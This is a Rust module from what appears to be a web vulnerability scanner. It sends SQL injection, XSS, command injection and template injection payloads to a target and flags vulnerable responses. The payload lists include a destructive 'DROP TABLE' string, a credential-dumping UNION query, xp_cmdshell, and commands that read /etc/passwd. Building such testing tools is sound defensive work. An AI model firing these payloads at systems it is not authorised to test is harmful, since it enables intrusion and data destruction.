//! Injection Probes — OWASP A01/A02/A08
//!
//! Tests for SQL Injection, XSS (Reflected), Command Injection, SSTI,
//! and Prompt Injection.

use std::sync::Arc;
use std::time::Duration;

use anyhow::Result;
use reqwest::Client;
use tokio::sync::Semaphore;
use tracing::debug;
use uuid::Uuid;

use crate::models::{Finding, FindingSource, OwaspCategory, Severity};

// ── SQL Injection Payloads ────────────────────────────────────────────────────

static SQLI_PAYLOADS: &[&str] = &[
    // Error-based
    "'",
    "''",
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "admin' #",
    // UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    // Boolean blind
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    // Time-based blind
    "'; WAITFOR DELAY '0:0:5'--",           // MSSQL
    "'; SELECT SLEEP(5)--",                  // MySQL
    "'; SELECT pg_sleep(5)--",              // PostgreSQL
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    // NoSQL
    "{ \"$gt\": \"\" }",
    "' || '1'=='1",
    // Second-order
    "admin'/*",
    "' OR 'x'='x",
    "'; EXEC xp_cmdshell('whoami'); --",
];

// ── XSS Payloads ──────────────────────────────────────────────────────────────

static XSS_PAYLOADS: &[&str] = &[
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "<body onload=alert('XSS')>",
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "<a href=\"javascript:alert('XSS')\">click</a>",
    "<details open ontoggle=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\">",
    "<input autofocus onfocus=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    "<object data=\"javascript:alert('XSS')\">",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
];

// ── Command Injection Payloads ────────────────────────────────────────────────

static CMDI_PAYLOADS: &[&str] = &[
    "; ls",
    "| ls",
    "& ls",
    "`ls`",
    "$(ls)",
    "; whoami",
    "| whoami",
    "& whoami",
    "`whoami`",
    "$(whoami)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; dir",
    "& dir",
    "| dir",
    "; id",
    "| id",
    "& id",
    "`id`",
    "$(id)",
];

// ── SSTI Payloads ─────────────────────────────────────────────────────────────

static SSTI_PAYLOADS: &[(&str, &str)] = &[
    ("{{7*7}}", "49"),       // Jinja2/Twig/Handlebars
    ("${7*7}", "49"),        // Java EL / FreeMarker
    ("#{7*7}", "49"),        // Th:leaf
    ("<%= 7*7 %>", "49"),   // ERB
    ("{{7*'7'}}", "7777777"), // Jinja2 string multiply
    ("${{7*7}}", "49"),
    ("*{7*7}", "49"),        // Spring EL
];

// ── Detection Patterns ────────────────────────────────────────────────────────

/// SQL error patterns that indicate SQLi success
static SQL_ERROR_PATTERNS: &[&str] = &[
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "ORA-01756",
    "Microsoft OLE DB Provider for SQL Server",
    "Unclosed quotation mark",
    "SQLSTATE",
    "pg_query()",
    "syntax error at or near",
    "SQLite3::query",
    "Column count doesn't match",
    "Mysql server version for the right syntax",
];

// ── Main Entry ────────────────────────────────────────────────────────────────

pub async fn run(
    client: Arc<Client>,
    sem: Arc<Semaphore>,
    target: &str,
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    // Collect common injectable endpoints by probing the base URL
    let test_urls = build_test_urls(target);

    findings.extend(probe_sqli(Arc::clone(&client), Arc::clone(&sem), &test_urls).await?);
    findings.extend(probe_xss(Arc::clone(&client), Arc::clone(&sem), &test_urls).await?);
    findings.extend(probe_cmdi(Arc::clone(&client), Arc::clone(&sem), &test_urls).await?);
    findings.extend(probe_ssti(Arc::clone(&client), Arc::clone(&sem), &test_urls).await?);

    Ok(findings)
}

/// Build a list of test URLs from the base target
fn build_test_urls(target: &str) -> Vec<String> {
    let base = target.trim_end_matches('/');
    vec![
        format!("{}/?id=1", base),
        format!("{}/search?q=test", base),
        format!("{}/login", base),
        format!("{}/api/user?id=1", base),
        format!("{}/api/search?query=test", base),
        format!("{}/product?id=1", base),
        format!("{}/page?num=1", base),
        format!("{}/view?item=1", base),
    ]
}

// ── SQL Injection ─────────────────────────────────────────────────────────────

async fn probe_sqli(
    client: Arc<Client>,
    sem: Arc<Semaphore>,
    urls: &[String],
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    let baseline_checks: Vec<_> = urls
        .iter()
        .map(|url| {
            let client = Arc::clone(&client);
            let sem = Arc::clone(&sem);
            let url = url.clone();
            async move {
                let _permit = sem.acquire().await.unwrap();
                client.get(&url).send().await.ok().map(|r| (url, r.status()))
            }
        })
        .collect();

    for url in urls {
        for payload in SQLI_PAYLOADS.iter().take(15) {
            let test_url = inject_payload(url, payload);
            let _permit = sem.acquire().await.unwrap();

            let response = match client.get(&test_url).send().await {
                Ok(r) => r,
                Err(_) => continue,
            };

            let body = match response.text().await {
                Ok(b) => b,
                Err(_) => continue,
            };

            let matched_pattern = SQL_ERROR_PATTERNS
                .iter()
                .find(|&&p| body.contains(p));

            if let Some(pattern) = matched_pattern {
                debug!("SQLi detected at {} with payload: {}", url, payload);
                findings.push(Finding {
                    id: Uuid::new_v4().to_string(),
                    category: OwaspCategory::BrokenAccessControl,
                    severity: Severity::Critical,
                    title: "SQL Injection".to_string(),
                    description: format!(
                        "SQL injection vulnerability detected. The payload `{}` triggered a database error: '{}'.",
                        payload, pattern
                    ),
                    evidence: Some(format!("GET {}\nPayload: {}\nError: {}", test_url, payload, pattern)),
                    remediation: "Use parameterized queries (prepared statements). Never concatenate user input into SQL. Apply input validation and least-privilege DB accounts.".to_string(),
                    source: FindingSource::Dast,
                    endpoint: Some(test_url),
                });
                break; // One confirmed finding per URL is enough
            }
        }
    }

    Ok(findings)
}

// ── XSS ───────────────────────────────────────────────────────────────────────

async fn probe_xss(
    client: Arc<Client>,
    sem: Arc<Semaphore>,
    urls: &[String],
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    for url in urls {
        for payload in XSS_PAYLOADS.iter().take(10) {
            let test_url = inject_payload(url, payload);
            let _permit = sem.acquire().await.unwrap();

            let response = match client.get(&test_url).send().await {
                Ok(r) => r,
                Err(_) => continue,
            };

            // Check content type before looking for reflected payload
            let ct = response
                .headers()
                .get("content-type")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("")
                .to_string();

            if !ct.contains("text/html") {
                continue;
            }

            let body = match response.text().await {
                Ok(b) => b,
                Err(_) => continue,
            };

            if body.contains(payload) {
                findings.push(Finding {
                    id: Uuid::new_v4().to_string(),
                    category: OwaspCategory::BrokenAccessControl,
                    severity: Severity::High,
                    title: "Reflected Cross-Site Scripting (XSS)".to_string(),
                    description: format!(
                        "The payload `{}` was reflected unencoded in the HTML response, indicating a reflected XSS vulnerability.",
                        payload
                    ),
                    evidence: Some(format!("GET {}\nPayload reflected in response body", test_url)),
                    remediation: "HTML-encode all user-supplied output. Implement a Content-Security-Policy. Use modern frontend frameworks that auto-escape output.".to_string(),
                    source: FindingSource::Dast,
                    endpoint: Some(test_url),
                });
                break;
            }
        }
    }

    Ok(findings)
}

// ── Command Injection ─────────────────────────────────────────────────────────

async fn probe_cmdi(
    client: Arc<Client>,
    sem: Arc<Semaphore>,
    urls: &[String],
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();
    let unix_indicators = ["root:x:0:0", "daemon", "/bin/bash", "uid=", "www-data"];
    let win_indicators = ["Windows IP", "Volume Serial", "Directory of"];

    for url in urls {
        for payload in CMDI_PAYLOADS.iter().take(10) {
            let test_url = inject_payload(url, payload);
            let _permit = sem.acquire().await.unwrap();

            let response = match client.get(&test_url).send().await {
                Ok(r) => r,
                Err(_) => continue,
            };

            let body = match response.text().await {
                Ok(b) => b,
                Err(_) => continue,
            };

            let all_indicators: Vec<&str> = unix_indicators.iter().chain(win_indicators.iter()).copied().collect();
            if let Some(indicator) = all_indicators.iter().find(|&&i| body.contains(i)) {
                findings.push(Finding {
                    id: Uuid::new_v4().to_string(),
                    category: OwaspCategory::IntegrityFailures,
                    severity: Severity::Critical,
                    title: "Command Injection".to_string(),
                    description: format!(
                        "OS command injection confirmed. The payload `{}` caused command output '{}' to appear in the response.",
                        payload, indicator
                    ),
                    evidence: Some(format!("GET {}\nPayload: {}\nResponse contained: {}", test_url, payload, indicator)),
                    remediation: "Never pass user input to shell commands. Use language APIs that accept argument lists. Apply strict input allowlisting.".to_string(),
                    source: FindingSource::Dast,
                    endpoint: Some(test_url),
                });
                break;
            }
        }
    }

    Ok(findings)
}

// ── SSTI ─────────────────────────────────────────────────────────────────────

async fn probe_ssti(
    client: Arc<Client>,
    sem: Arc<Semaphore>,
    urls: &[String],
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    for url in urls {
        for (payload, expected) in SSTI_PAYLOADS {
            let test_url = inject_payload(url, payload);
            let _permit = sem.acquire().await.unwrap();

            let response = match client.get(&test_url).send().await {
                Ok(r) => r,
                Err(_) => continue,
            };

            let body = match response.text().await {
                Ok(b) => b,
                Err(_) => continue,
            };

            if body.contains(expected) {
                findings.push(Finding {
                    id: Uuid::new_v4().to_string(),
                    category: OwaspCategory::IntegrityFailures,
                    severity: Severity::Critical,
                    title: "Server-Side Template Injection (SSTI)".to_string(),
                    description: format!(
                        "The template expression `{}` was evaluated server-side (output: `{}`), indicating SSTI. This can lead to remote code execution.",
                        payload, expected
                    ),
                    evidence: Some(format!("GET {}\nExpression: {} → {}", test_url, payload, expected)),
                    remediation: "Never allow user input to be interpreted as a template. Use sandboxed rendering. Upgrade or patch the template engine.".to_string(),
                    source: FindingSource::Dast,
                    endpoint: Some(test_url),
                });
                break;
            }
        }
    }

    Ok(findings)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Injects a payload into the last query parameter value
fn inject_payload(url: &str, payload: &str) -> String {
    if url.contains('=') {
        let encoded = urlencoding::encode(payload).to_string();
        // Replace the last parameter value
        if let Some(pos) = url.rfind('=') {
            format!("{}{}", &url[..=pos], encoded)
        } else {
            url.to_string()
        }
    } else {
        format!("{}?input={}", url, urlencoding::encode(payload))
    }
}
